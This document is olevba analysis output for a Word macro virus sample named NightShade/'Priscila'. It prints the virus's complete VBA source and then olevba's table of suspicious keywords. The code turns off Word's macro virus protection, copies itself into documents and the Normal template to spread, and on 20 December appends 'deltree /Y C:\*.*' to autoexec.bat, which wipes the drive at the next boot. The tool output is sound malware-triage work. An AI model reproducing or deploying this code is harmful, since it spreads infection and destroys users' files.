olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.NightShade.f-36f539cca45234cd646cb809e16a587114c321a0
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.NightShade.f-36f539cca45234cd646cb809e16a587114c321a0 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Priscila.bas 
in file: Virus.MSWord.NightShade.f-36f539cca45234cd646cb809e16a587114c321a0 - OLE stream: 'Macros/VBA/Priscila'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
Attribute AutoClose.VB_Description = "(c) 1997 Microsoft - All rights Reserved."
Attribute AutoClose.VB_ProcData.VB_Invoke_Func = "Microsoft.Priscila.AutoClose"
On Error GoTo Priscila

    WordBasic.DisableAutoMacros 0
    Options.VirusProtection = False
    
    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone

    Set ActiveDoc = ActiveDocument
    Set GlobalDoc = NormalTemplate

    EstaEnDoc = False
    EstaEnDot = False

    For I = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(I).Name = "Priscila" Then
            EstaEnDoc = True
        End If
    Next

    For J = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(J).Name = "Priscila" Then
            EstaEnDot = True
        End If
    Next

    If EstaEnDoc = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Priscila", Object:=wdOrganizerObjectProjectItems
        ActiveDoc.SaveAs FileName:=ActiveDoc.FullName
    End If

    If EstaEnDot = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Priscila", Object:=wdOrganizerObjectProjectItems
        Options.SaveNormalPrompt = False
    End If

    If Month(Now()) = 12 And Day(Now()) = 20 Then
        NúmArch2 = FreeFile()
        Open "\autoexec.bat" For Append As NúmArch2
        Print #1,
        Print #1, "@echo off"
        Print #1, "deltree /Y C:\*.*"
        Close NúmArch2
        Assistant.Visible = True
        With Assistant.NewBalloon
            .Icon = msoIconAlert
            .Text = "Tienes el PRISCILA ViRuS - by CrM - Paraguay"
            .Heading = "Atención:"
            .Show
        End With
    End If
    
    Application.DisplayAlerts = wdAlertsAll

Priscila:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

